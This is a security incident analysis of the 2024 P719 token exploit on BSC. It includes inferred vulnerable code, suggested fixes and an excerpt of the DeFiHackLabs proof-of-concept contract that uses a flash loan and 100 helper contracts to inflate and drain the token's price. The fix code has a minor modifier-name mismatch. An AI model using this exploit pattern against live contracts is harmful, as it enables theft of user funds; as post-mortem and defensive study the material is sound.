# P719Token — Business Logic Flaw (Price Inflation Attack) Analysis

| Item | Details |
|------|------|
| **Date** | 2024-10-11 |
| **Protocol** | P719 Token |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | 547.18 BNB (~$315,072 USD) |
| **Attacker** | [0xfeb1...eff6](https://bscscan.com/address/0xfeb19ae8c0448f25de43a3afcb7b29c9cef6eff6) |
| **Attack Contract** | [0x3f32...dc98](https://bscscan.com/address/0x3f32c7cfb0a78ddea80a2384ceb4633099cbdc98) |
| **Attack Tx** | [0x9afc...953b3](https://bscscan.com/tx/0x9afcac8e82180fa5b2f346ca66cf6eb343cd1da5a2cd1b5117eb7eaaebe953b3) |
| **Vulnerable Contract** | [0x6bee...4abc](https://bscscan.com/token/0x6beee2b57b064eac5f432fc19009e3e78734eabc) |
| **Root Cause** | Business logic flaw in `transfer()` — treating a self-transfer as a sell operation, artificially inflating price through fee redistribution |
| **PoC Source** | [DeFiHackLabs — P719Token_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/P719Token_exp.sol) |

---

## 1. Vulnerability Overview

The P719 token contract's `transfer()` function contains special logic that **treats a transfer to the contract itself (the P719 address) as a "sell" operation**. During this sell processing, a Uniswap-like swap mechanism is used to calculate the BNB return amount, after which **most of the sold tokens are burned and fee tokens held by the contract are transferred to the LP pool**.

This fee redistribution procedure is the core flaw. Token burning reduces the total supply, while simultaneously the surplus tokens held by the contract flow into the pool, **artificially increasing the BNB value per token unit**. The attacker repeatedly exploits this mechanism to incrementally pump the P719 price, then sells their holdings at the peak to extract a large amount of BNB.

The contract source code is unverified on BSCScan, and the vulnerability is embedded in the undisclosed `transfer()` logic.

**Key vulnerability summary:**
- Calling `transfer(to=P719, amount)` → internally processed as a "sell"
- After sell: token burn + contract fee token redistribution → **price inflation**
- Flash loan-funded large-scale repeated buys followed by selling at the inflated price → **profit realization**

---

## 2. Vulnerable Code Analysis

### 2.1 `transfer()` Function — Sell Processing and Price Inflation (Core Vulnerability)

Since the P719 contract is unverified, the following logic is reverse-engineered from the PoC code and on-chain behavior.

**Vulnerable code (inferred)**:
```solidity
// ❌ Vulnerable P719 transfer() function — simplified pseudocode
function transfer(address to, uint256 amount) public returns (bool) {
    if (to == address(this)) {
        // Transfer to contract itself = processed as "sell"
        uint256 bnbAmount = _calculateSellAmount(amount); // Uniswap-like calculation

        // ❌ Issue 1: Burns most of the sold tokens → supply decreases
        _burn(msg.sender, amount);

        // ❌ Issue 2: Redistributes fee tokens held by the contract to the pool
        //    → After burn, remaining pool price rises further due to fee redistribution
        _transferFeeTokensToPool();

        // Return BNB
        payable(msg.sender).transfer(bnbAmount);
    } else {
        // Normal transfer
        _balances[msg.sender] -= amount;
        _balances[to] += amount;
    }
    return true;
}

function _calculateSellAmount(uint256 tokenIn) internal view returns (uint256 bnbOut) {
    // ❌ Issue 3: reserveBNB is already elevated due to accumulated buys
    //    Fee redistribution also reflects an inflated unit price
    uint256 reserveToken = _reserves.token;
    uint256 reserveBNB   = _reserves.bnb;
    bnbOut = (tokenIn * reserveBNB) / (reserveToken + tokenIn);
}
```

**Fixed code (recommended)**:
```solidity
// ✅ Fixed transfer() — removes logic that treats self-transfer as a sell
function transfer(address to, uint256 amount) public returns (bool) {
    // ✅ Remove special branch that treats self-transfer as a sell
    require(to != address(this), "P719: self-transfer not allowed");

    _balances[msg.sender] -= amount;
    _balances[to] += amount;
    emit Transfer(msg.sender, to, amount);
    return true;
}

// ✅ Sells are only allowed through a dedicated explicit sell() function
function sell(uint256 amount) external nonReentrant {
    require(amount > 0, "P719: zero amount");
    // Includes slippage check, reentrancy protection, and event emission
    uint256 bnbOut = _calculateSellAmount(amount);
    _burn(msg.sender, amount);
    payable(msg.sender).transfer(bnbOut);
    // ✅ Fee redistribution only allowed in a way that minimizes price impact on sell
}
```

**Problem**: By performing sell processing alongside token burning and fee redistribution within the `transfer()` function, an attacker can repeatedly call `transfer(P719, amount)` to artificially drive up the price. With each sell, total supply decreases and fee tokens flowing into the pool cause the price to rise monotonically.

### 2.2 Fee Redistribution — Accelerating Price Inflation

```solidity
// ❌ Vulnerable fee redistribution logic (inferred)
function _transferFeeTokensToPool() internal {
    uint256 feeTokenBalance = _balances[address(this)];
    if (feeTokenBalance > _feeThreshold) {
        // ❌ Transfers accumulated fee tokens from the contract to the pool all at once
        //    → After each sell, pool token reserves change → price recalibrates
        _balances[address(this)] -= feeTokenBalance;
        _balances[_liquidityPool] += feeTokenBalance;
        // Reserve change without sync → price distortion
    }
}
```

```solidity
// ✅ Fix: Minimize market impact during fee redistribution
function _transferFeeTokensToPool() internal {
    // ✅ Do not send fees directly to the pool; instead deposit separately or burn
    // ✅ TWAP-based distributed allocation or governance-controlled distribution
    uint256 feeAmount = _pendingFees;
    _pendingFees = 0;
    _burn(address(this), feeAmount); // Burn to adjust supply only, preventing sudden price spikes
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

Before the attack, the attacker prepares the following two items in advance:
1. **Deploy MyToken**: A dummy ERC20 token owned by the attacker is deployed and paired with WBNB on PancakeSwap. This is used as the final profit extraction route.
2. **Deploy AttackerC2 contract array**: More than 100 independent buy/sell contracts are pre-deployed. Each contract sets an unlimited approve for P719 in its constructor.

### 3.2 Execution Phase

1. **Execute PancakeV3 flash loan**: Request a 4,000 WBNB flash loan from PancakeV3Pool.
2. **Unwrap WBNB → BNB**: Unwrap the borrowed 4,000 WBNB into native BNB.
3. **Phase 1 buys (14 × 10 BNB)**: Create 14 new AttackerC2 contracts, each buying 10 BNB worth of P719. P719 receives BNB via `receive()` and mints/transfers tokens.
4. **Phase 2 buys (33 × 100 BNB)**: Have 33 pre-deployed AttackerC2 contracts each buy 100 BNB worth. A total of 3,300 BNB input significantly pumps the P719 price.
5. **Token consolidation**: Consolidate the P719 holdings from 33 contracts into a single contract (attC2).
6. **Distributed sell in 100 splits (100 iterations)**: Distribute the consolidated P719 equally across 100 AttackerC2 contracts, then each contract calls `transfer(P719, amount)` to sell. With each sell, the price inflation mechanism executes, gradually increasing the BNB received by subsequent sellers.
7. **Profit extraction**: Wrap the received BNB into WBNB, then swap through the MyToken pair to absorb BNB into the pre-constructed liquidity.
8. **Remove liquidity**: Remove liquidity from the MyToken/WBNB LP position to finally recover 547 BNB.
9. **Repay flash loan**: Return 4,000 WBNB + fee to PancakeV3Pool.

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                         Attacker (attacker EOA)                      │
│  Deploy MyToken + create PancakeSwap WBNB/MyToken pair (0.001 BNB)  │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ Deploy AttackerC + setup()
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│              AttackerC.attack() → Request PancakeV3 flash loan       │
│              flash(4,000 WBNB)                                      │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ pancakeV3FlashCallback() executes
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Unwrap WBNB (4,000 WBNB → 4,000 BNB)                               │
└───────────────────────────┬─────────────────────────────────────────┘
                            │
             ┌──────────────┴──────────────┐
             ▼                             ▼
┌────────────────────────┐    ┌─────────────────────────┐
│  Phase 1 buys          │    │  Phase 2 buys            │
│  14 × 10 BNB           │    │  33 × 100 BNB            │
│  = 140 BNB input       │    │  = 3,300 BNB input       │
│  New AttackerC2 deploy │    │  Pre-deployed AttackerC2 │
└────────────┬───────────┘    └────────────┬────────────┘
             └──────────────┬──────────────┘
                            │ Consolidate P719 tokens (33 → single attC2)
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Distributed sell: Split P719 into 100 parts → distribute to        │
│  100 AttackerC2 contracts                                           │
│  Each AttackerC2.sell() → transfer(P719_address, amount)            │
│                                                                     │
│  ❌ Inside P719 transfer():                                          │
│     ① Sell processing → return BNB                                  │
│     ② Token burn → supply decreases → unit price rises              │
│     ③ Fee token redistribution to pool → price rises further        │
│  → After 100 iterations, stepwise price inflation complete          │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ Received BNB → wrap to WBNB
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│  WBNB → MyToken swap (PancakeRouter)                                 │
│  → BNB absorbed into attacker's pre-constructed WBNB/MyToken pair   │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ Repay flash loan (4,000 WBNB + fee)
                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Remove liquidity → Final recovery of 547.18 BNB (~$315,072)        │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

| Item | Value |
|------|------|
| Flash loan borrowed | 4,000 WBNB |
| Phase 1 buy input | 140 BNB (14 × 10 BNB) |
| Phase 2 buy input | 3,300 BNB (33 × 100 BNB) |
| Flash loan repaid | 4,000 WBNB + fee |
| **Attacker net profit** | **547.18 BNB (~$315,072)** |

---

## 4. PoC Code Excerpt (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Attack orchestrator contract
contract AttackerC {
    address myToken;
    AttackerC2[] attackerC2s33;  // 33 pre-deployed buy contracts
    AttackerC2[] attackerC2s100; // 100 pre-deployed sell contracts

    // [Step 1] Setup: Deploy multiple buy/sell contracts
    function setup(address _myToken) external {
        myToken = _myToken;
        for (uint256 i; i < 33; i++) {
            attackerC2s33.push(new AttackerC2()); // Create 33 buy contracts
        }
        for (uint256 i; i < 100; i++) {
            attackerC2s100.push(new AttackerC2()); // Create 100 sell contracts
        }
    }

    // [Step 2] Start attack: Request 4,000 WBNB flash loan from PancakeV3
    function attack() external {
        IFS(PancakeV3Pool).flash(
            address(this), 0, 4000 ether,
            hex"0000000000000000000000000000000000000000000000000000000000000001"
        );
    }

    // [Step 3] Flash loan callback: Execute actual attack logic
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        // [3-1] Unwrap WBNB → native BNB
        IFS(weth).withdraw(4000 ether);

        // [3-2] Small buys × 14 (10 BNB each): Initiate initial price increase
        for (uint256 i; i < 14; i++) {
            AttackerC2 attC2 = new AttackerC2();
            attC2.buy{value: 10 ether}(); // Calls P719.receive() → receive tokens
        }

        // [3-3] Large buys × 33 (100 BNB each): Rapidly pump the price
        for (uint256 i; i < attackerC2s33.length; i++) {
            attackerC2s33[i].buy{value: 100 ether}();
        }

        // [3-4] Consolidate tokens from 33 contracts into a single contract
        AttackerC2 attC2 = new AttackerC2();
        for (uint256 i; i < attackerC2s33.length; i++) {
            IERC20(P719).transferFrom(
                address(attackerC2s33[i]), address(attC2),
                IERC20(P719).balanceOf(address(attackerC2s33[i]))
            );
        }

        // [3-5] Split tokens into 100 parts and distribute across 100 contracts for selling
        // ❌ Core: Each sell calls P719.transfer(P719, amount)
        //         → Burn + fee redistribution causes price to rise stepwise
        uint256 balAttC4 = IERC20(P719).balanceOf(address(attC2));
        for (uint256 i; i < attackerC2s100.length; i++) {
            IERC20(P719).transferFrom(address(attC2), address(attackerC2s100[i]), balAttC4 / 100);
            attackerC2s100[i].sell(balAttC4 / 100); // sell = transfer(P719, amount)
        }

        // [3-6] Wrap received BNB into WBNB
        IFS(weth).deposit{value: address(this).balance}();
        uint256 bal3 = IERC20(weth).balanceOf(address(this));

        // [3-7] Swap WBNB to MyToken → absorb BNB into attacker's pair
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = myToken;
        IFS(PancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bal3 - 4000 ether - fee1, 0, path, address(this), block.timestamp
        );

        // [3-8] Repay flash loan
        IERC20(weth).transfer(PancakeV3Pool, 4000 ether + fee1);
    }
}

// Individual buy/sell contract
contract AttackerC2 {
    constructor() public payable {
        // On creation, grant unlimited approve for P719 to the caller (AttackerC)
        IERC20(P719).approve(msg.sender, type(uint256).max);
    }

    // Buy: Send BNB to the P719 contract → receive P719 tokens
    function buy() external payable {
        P719.call{value: msg.value}("");
    }

    // ❌ Sell: Transfer P719 tokens to the P719 contract itself
    //          → Internally processed as a "sell" (exploiting core vulnerability)
    function sell(uint256 amount) external {
        IERC20(P719).transfer(P719, amount); // transfer(to=P719, amount) → triggers sell
        msg.sender.call{value: address(this).balance}(""); // Return received BNB
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Business logic flaw in sell processing within `transfer()` | CRITICAL | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| V-02 | Price inflation via fee redistribution on sell | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-03 | Large-scale price manipulation combined with flash loan | HIGH | CWE-400 (Uncontrolled Resource Consumption) |
| V-04 | Unverified contract source code | MEDIUM | CWE-1059 (Insufficient Technical Documentation) |

### V-01: Business Logic Flaw in Sell Processing within `transfer()`

- **Description**: The ERC-20 standard `transfer(to, amount)` function contains a special branch that performs a sell operation when `to == address(this)`. This design is intentional, but since anyone can trigger this branch, the sell logic can be executed repeatedly from external callers.
- **Impact**: The attacker can execute numerous small sells repeatedly, accumulating the price increase effect from each sell, ultimately inflating the P719 token price by several multiples.
- **Attack conditions**: Hold P719 tokens + permission to call `transfer(P719_address, amount)` (anyone can do this)

### V-02: Price Inflation via Fee Redistribution on Sell

- **Description**: Every time a sell is processed, two actions occur simultaneously: ① total supply decreases from burning the sold tokens, and ② fee tokens held by the contract are transferred to the LP pool. Both actions increase the price per token unit, so the price rises continuously with each repeated sell.
- **Impact**: An attacker who buys first and sells later receives BNB at an increasingly elevated price with each sell iteration, maximizing profit.
- **Attack conditions**: Distributed selling through multiple independent addresses (using 100 contracts)

### V-03: Large-Scale Price Manipulation Combined with Flash Loan

- **Description**: Using a flash loan to instantly obtain 4,000 BNB, the full cycle of large-scale buys → price spike → distributed sells → profit extraction is executed within a single transaction. Because it is a single transaction, there is no opportunity for market response or defensive mechanisms to intervene.
- **Impact**: 547 BNB can be extracted in a single transaction without normal market intervention
- **Attack conditions**: Access to PancakeV3 flash loan + pre-deployment of AttackerC/AttackerC2 contracts

### V-04: Unverified Contract Source Code

- **Description**: The P719 token contract's source code is not verified on BSCScan, making it impossible for users and security researchers to audit the actual logic in advance.
- **Impact**: The dangerous `transfer()` logic is hidden, causing users to buy tokens without being aware of the risk.
- **Attack conditions**: N/A (design flaw)

---

## 6. Remediation Recommendations

### 6.1 Immediate Actions

```solidity
// ✅ [Fix 1] Remove sell processing special branch from transfer()
function transfer(address to, uint256 amount) public override returns (bool) {
    // Cannot transfer directly to the contract — sells only allowed via sell()
    require(to != address(this), "P719: direct transfer to contract not allowed");
    return super.transfer(to, amount);
}

// ✅ [Fix 2] Introduce explicit sell() function (with reentrancy protection)
bool private _selling;
modifier noReentrancy() {
    require(!_selling, "P719: reentrant call");
    _selling = true;
    _;
    _selling = false;
}

function sell(uint256 amount) external noReentrant {
    require(amount > 0, "P719: zero amount");
    uint256 bnbOut = _calculateSellAmount(amount);
    _burn(msg.sender, amount); // State change first (CEI pattern)
    // ✅ Fee redistribution separated — not executed immediately after sell
    payable(msg.sender).transfer(bnbOut);
    emit Sell(msg.sender, amount, bnbOut);
}
```

```solidity
// ✅ [Fix 3] Change fee redistribution to delayed/burn approach instead of immediate
function _processFees() internal {
    uint256 feeBalance = balanceOf(address(this));
    if (feeBalance > feeThreshold) {
        // Burn instead of immediate pool redistribution → prevents sudden price spike
        _burn(address(this), feeBalance);
        emit FeeBurned(feeBalance);
    }
}
```

### 6.2 Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: transfer() sell branch | Implement ERC-20 standard-compliant `transfer()`; separate sell into a dedicated function |
| V-02: Fee redistribution price distortion | Burn fees or accumulate in a separate treasury; prohibit immediate injection into the pool |
| V-03: Flash loan large-scale price manipulation | Slippage limits and prevention of large-volume trades within a single block (e.g., per-block max trade cap) |
| V-04: Unverified source code | Register contract source verification on BSCScan; conduct external security audit before deployment |
| General | Perform independent smart contract audit before deployment; open-source the code |

---

## 7. Lessons Learned

1. **Do not embed non-standard logic in the `transfer()` function**: Embedding side effects such as sells, burns, or redistributions in the ERC-20 standard `transfer()` creates an attack vector that anyone can repeatedly trigger. Sell/swap functionality must be separated into dedicated, explicit functions.

2. **Do not use self-reference (self-transfer) for special handling**: Implementing special behavior via the `to == address(this)` condition allows attackers to repeatedly call this path from multiple contracts, manipulating state in unexpected ways.

3. **Burns and fee redistribution directly affect the price**: Token burning reduces supply and raises the price, while fee redistribution within the pool alters pool ratios and distorts the price further. A design where both actions are executed simultaneously and repeatedly is directly exposed to price manipulation attacks.

4. **Flash loans enable all price manipulation attacks without capital constraints**: Protocol design must evaluate economic safety under the assumption that "an attacker can instantly obtain thousands of BNB."

5. **Unverified contracts cannot be trusted**: To protect users and investors, all operational contracts must have their source code registered and verified on block explorers before deployment. Unverified contracts cannot be security audited, making it difficult to detect hidden vulnerabilities.

6. **Attacks using distributed contracts**: A pattern where an attacker pre-deploys more than 100 contracts and executes them in a distributed fashion can bypass single-address-based defenses (e.g., per-address transaction limits). On-chain anti-bot mechanisms alone are insufficient; the robustness of the protocol logic itself is critical.

---

## 8. On-Chain Verification

> **Note**: Attack Tx hash `0x9afcac8e82180fa5b2f346ca66cf6eb343cd1da5a2cd1b5117eb7eaaebe953b3` is confirmed from the `@KeyInfo` annotation in the DeFiHackLabs PoC. The information below is derived from PoC code analysis; direct on-chain querying via `cast` tool was not performed.

### 8.1 PoC vs On-Chain Amount Comparison

| Item | PoC Value | On-Chain Record | Notes |
|------|--------|------------|------|
| Flash loan borrowed | 4,000 WBNB | 4,000 WBNB | Specified in PoC code |
| Phase 1 buys | 140 BNB (14×10) | — | Calculated from PoC loop |
| Phase 2 buys | 3,300 BNB (33×100) | — | Calculated from PoC loop |
| Net profit | 547.18 BNB | 547.18 BNB | Noted in `@KeyInfo` annotation |
| Loss (USD) | ~$312K | ~$315K | Price difference |

### 8.2 Related Addresses

| Role | Address | Link |
|------|------|------|
| Attacker EOA | `0xfeb19ae8c0448f25de43a3afcb7b29c9cef6eff6` | [BSCScan](https://bscscan.com/address/0xfeb19ae8c0448f25de43a3afcb7b29c9cef6eff6) |
| Attack contract | `0x3f32c7cfb0a78ddea80a2384ceb4633099cbdc98` | [BSCScan](https://bscscan.com/address/0x3f32c7cfb0a78ddea80a2384ceb4633099cbdc98) |
| P719 vulnerable contract | `0x6beee2b57b064eac5f432fc19009e3e78734eabc` | [BSCScan](https://bscscan.com/token/0x6beee2b57b064eac5f432fc19009e3e78734eabc) |
| PancakeV3Pool (flash loan) | `0x172fcD41E0913e95784454622d1c3724f546f849` | [BSCScan](https://bscscan.com/address/0x172fcD41E0913e95784454622d1c3724f546f849) |
| PancakeRouter | `0x10ED43C718714eb63d5aA57B78B54704E256024E` | [BSCScan](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |

### 8.3 Additional References

- **TenArmor Twitter analysis**: https://x.com/TenArmorAlert/status/1844929489823989953
- **DeFiHackLabs PoC**: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/P719Token_exp.sol
- **Attack block**: BSC #43,023,422 (PoC fork block: 43,023,423 - 1)

---

*Document date: 2026-04-11*
*Analysis based on: DeFiHackLabs PoC (authored by rotcivegaf), TenArmorAlert Twitter analysis*